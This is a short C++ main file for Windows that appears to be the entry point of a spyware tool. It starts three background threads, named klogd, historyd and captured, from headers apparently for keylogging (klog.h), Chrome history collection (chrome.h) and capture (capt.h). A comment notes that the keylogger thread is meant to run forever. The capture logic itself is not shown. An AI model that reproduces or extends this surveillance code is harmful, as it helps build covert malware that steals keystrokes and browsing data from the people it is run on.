#include <Windows.h>
#include <chrono>
#include <ctime>
#include <thread>

#include "write.h"
#include "chrome.h"
#include "klog.h"
#include "capt.h"

int main(){
    // Awaken the Daemons
    std::thread klogd(init_klogd);
    std::thread historyd(init_historyd);
    std::thread captured(init_captured);
    
    //This is just a theoretical end to keep the main thread running. Klogd will never join
    captured.join();
    historyd.join();
    klogd.join();

    return 0;
}